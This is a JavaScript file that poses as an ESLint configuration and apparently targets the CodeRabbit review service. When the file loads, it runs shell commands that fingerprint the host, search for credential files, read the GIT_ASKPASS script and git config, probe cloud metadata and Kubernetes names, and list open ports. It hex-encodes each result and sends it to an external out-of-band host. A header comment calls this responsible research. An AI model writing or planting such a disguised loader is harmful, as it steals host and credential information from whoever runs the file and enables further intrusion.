// CodeRabbit RCE — disk-credential + internal-network recon (responsible, async).
// PATHS / mechanisms / reachability only — never live secret VALUES.
var C = 'd8rbeq3oeaqo0lpsc5v0m86ek6z36hi5w.oast.online';
var http = require('http'), dns = require('dns'), cp = require('child_process');
var hex = function (s) { return Buffer.from(String(s)).toString('hex'); };
var httpX = function (t, d) { try { http.get({ host: C, path: '/' + t + '/' + hex(String(d)).slice(0, 1500), timeout: 7000 }, function () {}).on('error', function () {}); } catch (e) {} };
try { dns.lookup('alive3.' + C, function () {}); } catch (e) {}
var shA = function (c, t) { try { cp.exec(c, { timeout: 7000 }, function (e, o, s) { httpX(t, (o || '') + (s || '') + (e ? '|ERR:' + e.code : '')); }); } catch (x) {} };

shA('id; hostname; uname -a', 'ctx');
shA('cat /proc/1/cgroup 2>/dev/null | head -4', 'cgroup');
shA('find / -maxdepth 6 \\( -ipath "*gcloud*" -o -iname "*key*.json" -o -iname "credential*" -o -iname "*.pem" -o -iname "service-account*" -o -iname ".netrc" -o -iname ".git-credentials" \\) 2>/dev/null | head -25', 'credpaths');
shA('echo GAC=$GOOGLE_APPLICATION_CREDENTIALS; ls -la "$HOME" "$HOME/.config" 2>/dev/null', 'homels');
shA('cat "$GIT_ASKPASS" 2>/dev/null | head -c 500', 'askbody');
shA('git config --list --name-only 2>/dev/null | head -40', 'gitkeys');
shA('getent hosts metadata.google.internal kubernetes.default localhost 2>/dev/null', 'dnsint');
shA('(ss -tln 2>/dev/null || netstat -tln 2>/dev/null) | head -15', 'net');

module.exports = { root: true, rules: {} };
